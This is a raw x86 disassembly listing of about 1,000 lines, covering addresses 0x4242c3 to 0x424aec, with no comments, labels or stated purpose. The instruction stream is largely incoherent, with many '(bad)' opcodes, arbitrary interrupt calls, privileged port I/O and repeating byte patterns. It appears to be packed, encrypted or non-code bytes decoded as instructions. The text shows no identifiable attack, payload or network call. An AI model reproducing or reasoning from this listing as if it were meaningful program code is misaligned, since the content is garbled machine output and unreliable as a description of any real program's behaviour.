  4242c3:	int    0x76
  4242c5:	dec    esp
  4242c6:	int    0x1
  4242c8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ce:	xor    ch,cl
  4242d0:	jbe    0x42431e
  4242d2:	add    dh,dl
  4242d4:	in     eax,dx
  4242d5:	int    0x1
  4242d7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242dd:	dec    esp
  4242de:	leave  
  4242df:	jbe    0x424286
  4242e1:	pop    DWORD PTR [ebp*1-0x5a89368a]
  4242e8:	dec    edx
  4242e9:	pop    ss
  4242ea:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  4242f0:	xchg   esi,eax
  4242f1:	std    
  4242f2:	cmp    ecx,DWORD PTR [edi]
  4242f4:	cmp    ebx,ecx
  4242f6:	shr    ebx,cl
  4242f8:	xchg   edx,eax
  4242f9:	shr    edx,cl
  4242fb:	sub    BYTE PTR [ebx+0x13],dl
  4242fe:	or     dh,BYTE PTR [esi-0x4b]
  424301:	inc    ebx
  424302:	jge    0x4242da
  424304:	pop    eax
  424305:	int    0x76
  424307:	stc    
  424308:	int    0x8d
  42430a:	stc    
  42430b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42430e:	lock shl edx,cl
  424311:	sub    bl,dl
  424313:	mov    ebp,0xcdd35392
  424318:	lea    esp,[ebp+0x3ba596cd]
  42431e:	fnstcw WORD PTR [ebx]
  424320:	psrlq  mm5,mm2
  424323:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424329:	int    0x1
  42432b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424331:	xchg   edx,eax
  424332:	push   ebx
  424333:	jecxz  0x424364
  424335:	rcl    ebp,1
  424337:	bound  eax,QWORD PTR [eax]
  424339:	jo     0x42436f
  42433b:	int    0x76
  42433d:	std    
  42433e:	int    0x8d
  424340:	std    
  424341:	cmp    edi,DWORD PTR [ecx+0x3b]
  424344:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42434b:	push   ebx
  42434c:	rol    DWORD PTR [ebx+0x76],cl
  42434f:	mov    ch,0xd6
  424351:	and    ch,cl
  424353:	jbe    0x4242f2
  424355:	int    0x8d
  424357:	popf   
  424358:	cmp    esi,eax
  42435a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42435d:	mov    ebp,0x28f2d392
  424362:	push   ebx
  424363:	jge    0x4243a8
  424365:	fld    TBYTE PTR [edi]
  424367:	pop    es
  424368:	xchg   esp,eax
  424369:	add    BYTE PTR [eax],al
  42436b:	add    ch,cl
  42436d:	jbe    0x42436c
  42436f:	int    0x8d
  424371:	std    
  424372:	cmp    edi,DWORD PTR [ecx+0x3b]
  424375:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42437c:	push   ebx
  42437d:	rol    DWORD PTR [ebx+0x76],cl
  424380:	mov    ch,0xd6
  424382:	and    ch,cl
  424384:	jbe    0x42437f
  424386:	int    0x8d
  424388:	stc    
  424389:	cmp    edi,DWORD PTR [ecx+0x3b]
  42438c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424393:	push   ebx
  424394:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42439a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243a4:	leave  
  4243a5:	jbe    0x42439c
  4243a7:	fdivr  st,st(4)
  4243a9:	sbb    al,0xb
  4243ab:	int    0xa6
  4243ad:	std    
  4243ae:	int    0x76
  4243b0:	std    
  4243b1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243b7:	xchg   edx,eax
  4243b8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243be:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243c4:	std    
  4243c5:	int    0x8d
  4243c7:	std    
  4243c8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243cb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243d2:	push   ebx
  4243d3:	ror    DWORD PTR [edx],cl
  4243d5:	jbe    0x4243c4
  4243d7:	int    0x76
  4243d9:	std    
  4243da:	int    0x8d
  4243dc:	std    
  4243dd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243e0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243e7:	push   ebx
  4243e8:	ror    DWORD PTR [edx],cl
  4243ea:	jbe    0x4243e1
  4243ec:	int    0x8d
  4243ee:	std    
  4243ef:	int    0x76
  4243f1:	std    
  4243f2:	cmp    ecx,DWORD PTR [edi]
  4243f4:	cmp    ecx,ecx
  4243f6:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  4243fc:	push   ebx
  4243fd:	jge    0x4243cc
  4243ff:	jbe    0x424396
  424401:	inc    ebx
  424402:	jge    0x4243d8
  424404:	xchg   ch,cl
  424406:	test   BYTE PTR ds:0xcded760a,bl
  42440c:	jbe    0x4243bb
  42440e:	int    0x84
  424410:	sbb    eax,0xcdf5760a
  424415:	jbe    0x424414
  424417:	int    0x8d
  424419:	std    
  42441a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42441d:	lock shl edx,cl
  424420:	sub    bl,dl
  424422:	mov    ebp,0xcdd35392
  424427:	(bad)  
  424428:	in     eax,dx
  424429:	inc    ebx
  42442a:	rcl    esp,cl
  42442c:	push   esp
  42442d:	int    0x76
  42442f:	std    
  424430:	int    0x8d
  424432:	std    
  424433:	cmp    esi,eax
  424435:	cmp    edi,DWORD PTR [ecx-0x2d]
  424438:	repnz sub bl,dl
  42443b:	mov    ebp,0xcdd35392
  424440:	(bad)  
  424441:	in     eax,dx
  424442:	shr    ebx,cl
  424444:	sub    al,BYTE PTR [ebx-0x2d]
  424447:	aam    0x1c
  424449:	int    0x8d
  42444b:	in     eax,dx
  42444c:	int    0x76
  42444e:	dec    esp
  42444f:	int    0x1
  424451:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424457:	retf   
  424458:	jno    0x42445a
  42445a:	(bad)  
  42445b:	mov    ch,0x0
  42445d:	jo     0x4243e7
  42445f:	in     al,dx
  424460:	push   ds
  424461:	int    0x76
  424463:	cmc    
  424464:	xchg   DWORD PTR [esi-0x78],esi
  424467:	int    0x8d
  424469:	dec    esp
  42446a:	int    0xa
  42446c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424472:	xchg   edx,eax
  424473:	jo     0x424475
  424475:	(bad)  
  424476:	mov    ch,0x0
  424478:	jno    0x424402
  42447a:	or     dh,BYTE PTR [esi-0xb]
  42447d:	int    0x76
  42447f:	std    
  424480:	int    0x8d
  424482:	std    
  424483:	cmp    edi,DWORD PTR [ecx+0x3b]
  424486:	lock shl edx,cl
  424489:	sub    bl,dl
  42448b:	mov    ebp,0xcdd35392
  424490:	(bad)  
  424491:	cmc    
  424492:	inc    ebx
  424493:	ror    ebp,cl
  424495:	jbe    0x424490
  424497:	int    0x8d
  424499:	stc    
  42449a:	(bad)  
  42449b:	xor    DWORD PTR [ebx],edi
  42449d:	jns    0x4244da
  42449f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244a6:	push   ebx
  4244a7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244ad:	cmp    esi,eax
  4244af:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244b2:	repnz sub bl,dl
  4244b5:	mov    ebp,0xcdd35392
  4244ba:	(bad)  
  4244bb:	cmc    
  4244bc:	das    
  4244bd:	rcl    ebx,1
  4244bf:	int    0x8d
  4244c1:	lods   eax,DWORD PTR ds:[esi]
  4244c2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244c9:	(bad)  
  4244ca:	stc    
  4244cb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ce:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244d5:	push   ebx
  4244d6:	rol    DWORD PTR [edi-0x2893263],cl
  4244dc:	int    0x8d
  4244de:	std    
  4244df:	cmp    esi,eax
  4244e1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244e4:	repnz sub bl,dl
  4244e7:	mov    ebp,0xcdd35392
  4244ec:	lea    ebp,[ebp+0x2f1f845e]
  4244f2:	push   es
  4244f3:	or     al,0xff
  4244f5:	add    BYTE PTR [eax],al
  4244f7:	int    0x76
  4244f9:	adc    ebp,ecx
  4244fb:	lea    edx,[ecx]
  4244fd:	ins    BYTE PTR es:[edi],dx
  4244fe:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424504:	test   BYTE PTR [eax-0x2cac7f80],al
  42450a:	int    0x8d
  42450c:	icebp  
  42450d:	push   esi
  42450e:	dec    ecx
  42450f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424515:	add    BYTE PTR [eax],al
  424517:	int    0x76
  424519:	std    
  42451a:	int    0x8d
  42451c:	std    
  42451d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424520:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424527:	push   ebx
  424528:	rcr    DWORD PTR [esi+0x76],cl
  42452b:	mov    ebp,0x76cd88d6
  424530:	stc    
  424531:	int    0x8d
  424533:	stc    
  424534:	in     al,dx
  424535:	xchg   ch,cl
  424537:	jbe    0x424536
  424539:	int    0x8d
  42453b:	std    
  42453c:	cmp    esi,eax
  42453e:	cmp    edi,DWORD PTR [ecx-0x56]
  424541:	shl    edx,cl
  424543:	sub    bl,dl
  424545:	mov    ebp,0xd353a892
  42454a:	arpl   bx,cx
  42454c:	ror    BYTE PTR [eax-0x12326980],cl
  424552:	add    al,0xed
  424554:	xor    al,0xc9
  424556:	jbe    0x424555
  424558:	dec    ecx
  424559:	and    DWORD PTR [esi-0x528936cb],eax
  42455f:	inc    ecx
  424560:	and    DWORD PTR [esi+0x4c76cd35],eax
  424566:	or     dh,BYTE PTR [esi+0x4c]
  424569:	cwde   
  42456a:	int    0x6d
  42456c:	int    0x76
  42456e:	std    
  42456f:	int    0x96
  424571:	std    
  424572:	sar    bh,0x5f
  424575:	shl    DWORD PTR [ecx],1
  424577:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42457d:	cdq    
  42457e:	shr    edx,cl
  424580:	sub    bl,dl
  424582:	mov    ebp,0xcdd25392
  424587:	xchg   esi,eax
  424588:	mov    BYTE PTR [ebx-0xf],al
  42458b:	das    
  42458c:	add    eax,0x80808159
  424591:	int    0x76
  424593:	mov    ch,cl
  424595:	xchg   esi,eax
  424596:	mov    BYTE PTR [edi+0xa9a6470],al
  42459c:	xchg   esi,eax
  42459d:	cmc    
  42459e:	leave  
  42459f:	jbe    0x42459a
  4245a1:	popa   
  4245a2:	and    DWORD PTR [esi-0x68932cb],eax
  4245a8:	int    0x96
  4245aa:	stc    
  4245ab:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245b1:	rcl    ebx,cl
  4245b3:	mov    ebp,0xcdd25392
  4245b8:	xchg   esi,eax
  4245b9:	std    
  4245ba:	int    0xe6
  4245bc:	std    
  4245bd:	cmp    esp,ebx
  4245bf:	cmp    edi,edi
  4245c1:	shr    ecx,cl
  4245c3:	sub    bl,dl
  4245c5:	repz xchg edx,eax
  4245c7:	push   ebx
  4245c8:	fxch   st(5)
  4245ca:	out    0xf5,al
  4245cc:	pop    esi
  4245cd:	xchg   esp,eax
  4245ce:	leave  
  4245cf:	fsubr  QWORD PTR [edi]
  4245d1:	add    eax,0x8080816b
  4245d6:	int    0x96
  4245d8:	cmc    
  4245d9:	int    0x76
  4245db:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  4245e1:	or     ch,0x96
  4245e4:	mov    ch,cl
  4245e6:	out    0xf5,al
  4245e8:	xor    ebx,DWORD PTR [edx-0x21932ac]
  4245ee:	pop    ebx
  4245ef:	int    0xa6
  4245f1:	std    
  4245f2:	cmp    edi,edx
  4245f4:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  4245fa:	in     eax,0x28
  4245fc:	push   ebx
  4245fd:	cld    
  4245fe:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424604:	add    eax,0x8080814f
  424609:	int    0x96
  42460b:	std    
  42460c:	int    0xe6
  42460e:	std    
  42460f:	cmp    esp,ebx
  424611:	cmp    edi,edi
  424613:	shl    ebx,cl
  424615:	xchg   edx,eax
  424616:	shr    ecx,cl
  424618:	sub    BYTE PTR [ebx-0x27],dl
  42461b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424621:	mov    dl,0x21
  424623:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424629:	out    0xfd,al
  42462b:	cmp    esp,ebx
  42462d:	cmp    edi,edi
  42462f:	shl    ebx,cl
  424631:	xchg   edx,eax
  424632:	shr    ecx,cl
  424634:	sub    BYTE PTR [ebx-0x27],dl
  424637:	jmp    0x42463b
  424639:	add    BYTE PTR [eax-0x2693280],0xcd
  424640:	(bad)  
  424641:	std    
  424642:	add    al,0xf7
  424644:	(bad)  
  424645:	cmp    esp,ebx
  424647:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42464d:	push   ebx
  42464e:	cdq    
  42464f:	iret   
  424650:	ja     0x42464b
  424652:	jecxz  0x424643
  424654:	inc    ebx
  424655:	cdq    
  424656:	das    
  424657:	add    al,0x21
  424659:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424660:	jo     0x4245ea
  424662:	or     dl,dh
  424664:	mov    ch,0x2f
  424666:	mov    ebx,0xea121a
  42466b:	das    
  42466c:	add    BYTE PTR [eax-0x321269f6],0x96
  424673:	in     eax,dx
  424674:	xchg   DWORD PTR [eax],esi
  424676:	int    0xd6
  424678:	in     eax,dx
  424679:	xchg   DWORD PTR [eax-0x2d],edx
  42467c:	repz sub bl,dl
  42467f:	mov    ecx,0x2ffb5392
  424684:	mov    ebx,0x4cf3d31a
  424689:	adc    dh,bh
  42468b:	dec    ecx
  42468c:	and    DWORD PTR [esi-0x1229f5cb],eax
  424692:	or     dl,BYTE PTR [esi-0x12693243]
  424698:	int    0xd6
  42469a:	in     eax,dx
  42469b:	cmp    esp,ebx
  42469d:	add    al,0xf7
  42469f:	call   ebx
  4246a1:	repz xchg edx,eax
  4246a3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246a9:	xchg   esi,eax
  4246aa:	mov    BYTE PTR [edx],cl
  4246ac:	xchg   esi,eax
  4246ad:	in     eax,dx
  4246ae:	int    0x96
  4246b0:	dec    esp
  4246b1:	int    0xd6
  4246b3:	dec    esp
  4246b4:	cmp    esp,ebx
  4246b6:	add    al,0xf7
  4246b8:	call   ebx
  4246ba:	mov    ecx,0x92f3d328
  4246bf:	push   ebx
  4246c0:	cdq    
  4246c1:	int    0xd6
  4246c3:	mov    ebp,0x32d6fb43
  4246c8:	int    0x96
  4246ca:	dec    esp
  4246cb:	int    0xd6
  4246cd:	dec    esp
  4246ce:	cmp    esp,ebx
  4246d0:	add    al,0xf7
  4246d2:	call   ebx
  4246d4:	mov    ecx,0x92f3d328
  4246d9:	push   ebx
  4246da:	cdq    
  4246db:	int    0xd6
  4246dd:	mov    ebp,0x88d6fb43
  4246e2:	int    0x96
  4246e4:	in     eax,dx
  4246e5:	int    0xd6
  4246e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246e8:	add    DWORD PTR [edx+0x4],0x8d0092c9
  4246ef:	mov    ch,0x2f
  4246f1:	push   es
  4246f2:	xchg   ebx,eax
  4246f3:	add    BYTE PTR [eax],al
  4246f5:	add    BYTE PTR [ecx-0x6932ee5a],al
  4246fb:	stc    
  4246fc:	int    0xd6
  4246fe:	stc    
  4246ff:	cmp    esp,ebx
  424701:	add    al,0xf7
  424703:	call   ebx
  424705:	mov    ecx,0x92f3d328
  42470a:	push   ebx
  42470b:	cdq    
  42470c:	int    0xd6
  42470e:	adc    ebp,ecx
  424710:	out    0xf5,al
  424712:	inc    ebx
  424713:	aam    0xd9
  424715:	in     al,0x77
  424717:	sub    al,0xcd
  424719:	xchg   esi,eax
  42471a:	std    
  42471b:	int    0xd6
  42471d:	std    
  42471e:	cmp    esp,ebx
  424720:	add    al,0xf7
  424722:	call   ebx
  424724:	repz xchg edx,eax
  424726:	sar    DWORD PTR [ecx+0x53c58728],cl
  42472c:	cdq    
  42472d:	int    0x9c
  42472f:	test   BYTE PTR [ebx-0x1e],al
  424732:	das    
  424733:	push   es
  424734:	test   BYTE PTR [eax],al
  424736:	add    BYTE PTR [eax],al
  424738:	arpl   bp,cx
  42473a:	jbe    0x4246e9
  42473c:	cmp    edx,ebx
  42473e:	int    0x8d
  424740:	lods   eax,DWORD PTR ds:[esi]
  424741:	add    al,0x2
  424743:	jmp    FWORD PTR [edx+0x76cd4aec]
  424749:	std    
  42474a:	cmp    edx,ebx
  42474c:	int    0x8d
  42474e:	std    
  42474f:	cmp    ecx,DWORD PTR [edi]
  424751:	shl    edx,cl
  424753:	sub    bl,dl
  424755:	mov    ebp,0xa8d35392
  42475a:	retf   
  42475b:	ror    BYTE PTR [eax-0x12326980],cl
  424761:	adc    ch,ch
  424763:	xchg   ebp,eax
  424764:	add    BYTE PTR [eax-0x2893680],0x49
  42476b:	and    DWORD PTR [esi-0x68936cb],eax
  424771:	inc    ecx
  424772:	and    DWORD PTR [esi-0x28932cb],eax
  424778:	int    0x8d
  42477a:	std    
  42477b:	cwde   
  42477c:	call   0x8621:0xd169ffc0
  424783:	xor    eax,0xbdd3793b
  424788:	xchg   edx,eax
  424789:	mov    al,ds:0xf2d3133b
  42478e:	sub    BYTE PTR [ebx-0x2d],dl
  424791:	or     dh,BYTE PTR [esi-0x53]
  424794:	int    0x76
  424796:	std    
  424797:	int    0x8d
  424799:	std    
  42479a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42479d:	mov    ebp,0xd3133b92
  4247a2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247a6:	or     dh,BYTE PTR [esi-0xf]
  4247a9:	int    0xe6
  4247ab:	and    al,0xcd
  4247ad:	jbe    0x42479c
  4247af:	int    0x8d
  4247b1:	in     eax,dx
  4247b2:	cmp    edx,ebx
  4247b4:	or     dh,BYTE PTR [esi-0x13]
  4247b7:	adc    dh,BYTE PTR [esi-0x13]
  4247ba:	dec    ecx
  4247bb:	mov    al,ds:0x76cd3586
  4247c0:	cmc    
  4247c1:	int    0x8d
  4247c3:	cmc    
  4247c4:	cmp    edx,ebx
  4247c6:	or     dh,BYTE PTR [esi-0xb]
  4247c9:	adc    dh,BYTE PTR [esi-0xb]
  4247cc:	dec    ecx
  4247cd:	lahf   
  4247ce:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247d4:	lea    edx,[ecx]
  4247d6:	cmp    edx,ebx
  4247d8:	or     dh,BYTE PTR [esi+0x11]
  4247db:	adc    dh,BYTE PTR [esi+0x11]
  4247de:	imul   esp,DWORD PTR [ecx],0x76cd3586
  4247e4:	mov    ch,0xcd
  4247e6:	lea    esi,[ebp+0x760ad33b]
  4247ec:	mov    ch,0x12
  4247ee:	jbe    0x4247a5
  4247f0:	dec    ecx
  4247f1:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  4247f8:	hlt    
  4247f9:	mov    esi,DWORD PTR ds:0x68876cd
  4247ff:	ins    DWORD PTR es:[edi],dx
  424800:	das    
  424801:	add    eax,0x80808551
  424806:	int    0x76
  424808:	dec    esp
  424809:	push   es
  42480a:	ins    DWORD PTR es:[edi],dx
  42480b:	das    
  42480c:	add    eax,0x80808538
  424811:	int    0x76
  424813:	sbb    al,0x6
  424815:	ins    DWORD PTR es:[edi],dx
  424816:	das    
  424817:	add    eax,0x80808523
  42481c:	int    0x76
  42481e:	and    al,0xcd
  424820:	jbe    0x424846
  424822:	int    0x8d
  424824:	mov    bl,dl
  424826:	mov    ebp,0x39af5692
  42482b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424832:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42483c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42483f:	mov    ebp,0xd3133b92
  424844:	repnz sub BYTE PTR [ebx-0x2d],dl
  424848:	or     dh,BYTE PTR [esi-0xf]
  42484b:	int    0x76
  42484d:	std    
  42484e:	int    0x76
  424850:	std    
  424851:	int    0x76
  424853:	mov    ch,cl
  424855:	lea    ecx,[eax-0x329b8379]
  42485b:	outs   dx,BYTE PTR ds:[esi]
  42485c:	jo     0x424868
  42485e:	lea    esp,[esi+eax*1]
  424861:	ins    DWORD PTR es:[edi],dx
  424862:	das    
  424863:	add    eax,0x808084f0
  424868:	leave  
  424869:	jbe    0x424800
  42486b:	dec    ecx
  42486c:	and    DWORD PTR [eax+0x35],edi
  42486f:	int    0x76
  424871:	xchg   ebp,eax
  424872:	pop    ebx
  424873:	int    0xa6
  424875:	xchg   ebp,eax
  424876:	cmp    edi,DWORD PTR [ecx+0x3b]
  424879:	loop   0x42484e
  42487b:	mov    ebp,0x28e5d392
  424880:	push   ebx
  424881:	popf   
  424882:	or     ah,BYTE PTR [esi-0x289326b]
  424888:	int    0x76
  42488a:	std    
  42488b:	int    0x8
  42488d:	sub    eax,0xcd808081
  424892:	xor    ch,cl
  424894:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424898:	int    0x76
  42489a:	std    
  42489b:	int    0x76
  42489d:	std    
  42489e:	int    0x8
  4248a0:	and    eax,0xcd808081
  4248a5:	sbb    al,0xa
  4248a7:	xchg   esi,eax
  4248a8:	dec    esp
  4248a9:	inc    ebx
  4248aa:	fst    st(6)
  4248ac:	push   0xffffffcd
  4248ae:	(bad)  
  4248af:	cmc    
  4248b0:	int    0x8
  4248b2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248b8:	lods   eax,DWORD PTR ds:[esi]
  4248b9:	(bad)  
  4248ba:	int    0x96
  4248bc:	cmc    
  4248bd:	cmp    ecx,DWORD PTR [edi]
  4248bf:	add    al,0xfb
  4248c1:	call   ebx
  4248c3:	jmp    0x424857
  4248c5:	shr    edx,cl
  4248c7:	sub    BYTE PTR [ebx-0x1d],dl
  4248ca:	int    0x8d
  4248cc:	dec    esp
  4248cd:	bound  eax,QWORD PTR [eax]
  4248cf:	xchg   ecx,eax
  4248d0:	jo     0x42492d
  4248d2:	add    BYTE PTR [eax+0x24],dh
  4248d5:	int    0x8d
  4248d7:	dec    esp
  4248d8:	int    0x6e
  4248da:	xchg   esp,eax
  4248db:	int    0x7e
  4248dd:	jo     0x424912
  4248df:	jge    0x424952
  4248e1:	xchg   ebp,eax
  4248e3:	jo     0x4248a2
  4248e5:	dec    esi
  4248e6:	xchg   BYTE PTR [eax+0x248dcd80],al
  4248ec:	int    0x8
  4248ee:	xor    eax,0xa808081
  4248f3:	sbb    al,0x0
  4248f5:	xchg   ecx,eax
  4248f6:	xchg   esp,eax
  4248f7:	add    dh,dl
  4248f9:	mov    BYTE PTR [ebx-0x43],bl
  4248fc:	or     eax,0xcd808084
  424901:	pop    ebx
  424902:	fs xchg ebp,edx
  424905:	das    
  424906:	mov    ebx,0x74cf1452
  42490b:	xor    BYTE PTR [edx+ecx*1],bl
  42490e:	jbe    0x42492c
  424910:	int    0x76
  424912:	std    
  424913:	int    0x8d
  424915:	std    
  424916:	cmp    edi,DWORD PTR [ecx+0x4]
  424919:	add    bh,bh
  42491b:	shl    edx,cl
  42491d:	sub    bl,dl
  42491f:	mov    ebp,0x2fd35392
  424924:	mov    ebx,0x960a868a
  424929:	and    al,0x43
  42492b:	jge    0x42495c
  42492d:	add    eax,0x808080e9
  424932:	int    0x76
  424934:	std    
  424935:	int    0x8d
  424937:	std    
  424938:	cmp    edi,DWORD PTR [ecx+0x4]
  42493b:	add    bh,bh
  42493d:	shl    edx,cl
  42493f:	sub    bl,dl
  424941:	mov    ebp,0xad35392
  424946:	jbe    0x4248ed
  424948:	int    0x76
  42494a:	stc    
  42494b:	int    0x8d
  42494d:	stc    
  42494e:	add    al,0x2
  424950:	(bad)  
  424951:	cmp    edi,DWORD PTR [ecx-0x2d]
  424954:	repnz sub bl,dl
  424957:	mov    ebp,0x2fd35392
  42495c:	mov    ebx,0x7d33868a
  424961:	pop    esi
  424962:	lea    esp,[ebp-0x7f2ef7d1]
  424968:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42496f:	mov    BYTE PTR [edx],cl
  424971:	lea    ebx,[esp+ebp*8]
  424974:	xchg   ebp,ecx
  424976:	lea    ebx,[ecx*8+0x31cd5c52]
  42497d:	or     dh,BYTE PTR [esi-0x63]
  424980:	jl     0x424988
  424982:	icebp  
  424983:	aam    0x89
  424985:	clc    
  424986:	icebp  
  424987:	sub    edx,edx
  424989:	xchg   DWORD PTR [esi-0x63],esi
  42498c:	in     al,dx
  42498d:	xchg   edx,eax
  42498e:	int    0xd2
  424990:	jo     0x42495f
  424992:	outs   dx,BYTE PTR ds:[esi]
  424993:	test   BYTE PTR [edi+0x63bd70c5],al
  424999:	test   DWORD PTR [eax+0x1c76cd80],eax
  42499f:	int    0x7c
  4249a1:	mov    BYTE PTR [edx],cl
  4249a3:	lea    ebx,[ebp-0x32027233]
  4249a9:	xchg   esi,eax
  4249aa:	std    
  4249ab:	cmp    ecx,DWORD PTR [edi]
  4249ad:	add    al,0xfb
  4249af:	call   ebx
  4249b1:	jmp    0x424945
  4249b3:	shr    edx,cl
  4249b5:	sub    BYTE PTR [ebx+0x13],dl
  4249b8:	pop    esi
  4249b9:	lea    ebx,[ebp-0x7232e32c]
  4249bf:	mov    BYTE PTR [edi-0x29ffb384],al
  4249c5:	popf   
  4249c6:	int    0x6c
  4249c8:	test   BYTE PTR [ecx-0x79],dh
  4249cb:	lds    esi,FWORD PTR [eax-0x43]
  4249ce:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249d4:	sbb    al,0xcd
  4249d6:	(bad)  
  4249d7:	stc    
  4249d8:	int    0x96
  4249da:	stc    
  4249db:	cmp    ecx,DWORD PTR [edi]
  4249dd:	shr    ebx,cl
  4249df:	xchg   edx,eax
  4249e0:	add    al,0xfb
  4249e2:	inc    DWORD PTR [ebp*2+0x28ead33c]
  4249e9:	push   ebx
  4249ea:	adc    eax,DWORD PTR [ecx-0x69325a73]
  4249f0:	and    al,0xa
  4249f2:	jbe    0x424a10
  4249f4:	int    0x76
  4249f6:	stc    
  4249f7:	int    0x8d
  4249f9:	stc    
  4249fa:	add    al,0x2
  4249fc:	(bad)  
  4249fd:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a00:	repnz sub bl,dl
  424a03:	mov    ebp,0xcdd35392
  424a08:	lea    esp,[edi+ebp*1]
  424a0b:	mov    ebx,0x7d33867e
  424a10:	pop    esi
  424a11:	lea    esp,[ebp+0xa4072f]
  424a17:	add    BYTE PTR [eax],al
  424a19:	int    0x8
  424a1b:	and    eax,0x43808081
  424a20:	sbb    al,0xd6
  424a22:	cmp    ecx,ebp
  424a24:	lea    edx,[ecx]
  424a26:	int    0x8
  424a28:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a2e:	lods   eax,DWORD PTR ds:[esi]
  424a2f:	(bad)  
  424a30:	int    0x96
  424a32:	adc    DWORD PTR [ebx],edi
  424a34:	(bad)  
  424a36:	sti    
  424a37:	call   ebx
  424a39:	jmp    0x4249cd
  424a3b:	shr    edx,cl
  424a3d:	sub    BYTE PTR [ebx-0x1d],dl
  424a40:	int    0x8d
  424a42:	dec    esp
  424a43:	bound  eax,QWORD PTR [eax]
  424a45:	xchg   ecx,eax
  424a46:	xchg   esp,eax
  424a47:	pop    ebx
  424a48:	add    BYTE PTR [eax+0x24],dh
  424a4b:	push   es
  424a4c:	ins    DWORD PTR es:[edi],dx
  424a4d:	das    
  424a4e:	add    eax,0x808092d9
  424a53:	int    0x96
  424a55:	and    al,0xcd
  424a57:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a5d:	or     ch,0x7d
  424a60:	cmp    ecx,DWORD PTR [edi]
  424a62:	add    al,0x11
  424a64:	call   ebx
  424a66:	jmp    0x4249fa
  424a68:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a6e:	add    eax,0x808081da
  424a73:	int    0x76
  424a75:	std    
  424a76:	int    0x8d
  424a78:	std    
  424a79:	cmp    edi,DWORD PTR [ecx+0x4]
  424a7c:	add    bh,bh
  424a7e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424a84:	push   ebx
  424a85:	ror    DWORD PTR [edx],cl
  424a87:	jbe    0x424a46
  424a89:	pop    ebp
  424a8a:	push   0xcf35869f
  424a8f:	jl     0x424a3e
  424a91:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424a97:	leave  
  424a98:	jbe    0x424adf
  424a9a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424aa0:	shr    al,1
  424aa2:	lahf   
  424aa3:	xchg   BYTE PTR ds:0xc955760a,dh
  424aa9:	jbe    0x424b18
  424aab:	dec    ecx
  424aac:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ab2:	xchg   esp,eax
  424ab3:	iret   
  424ab4:	inc    ebp
  424ab5:	shl    ebx,cl
  424ab7:	xchg   edx,eax
  424ab8:	adc    bh,bl
  424aba:	scas   eax,DWORD PTR es:[edi]
  424abb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424ac1:	lea    esi,[eax+eax*1+0x0]
  424ac5:	add    BYTE PTR [esi+0x4],ch
  424ac8:	cli    
  424ac9:	xchg   BYTE PTR [edx-0x6047a019],al
  424acf:	xchg   BYTE PTR ds:0x94060a,dh
  424ad5:	add    BYTE PTR [eax],al
  424ad7:	or     al,BYTE PTR [esi]
  424ad9:	mov    esp,0xa000000
  424ade:	jbe    0x424a90
  424ae0:	or     dh,BYTE PTR [esi+0x15]
  424ae3:	iret   
  424ae4:	outs   dx,BYTE PTR ds:[esi]
  424ae5:	std    
  424ae6:	iret   
  424ae7:	jno    0x424b59
  424ae9:	or     dh,BYTE PTR [esi+0x2d]
  424aec:	or     dh,BYTE PTR [esi+0x35]
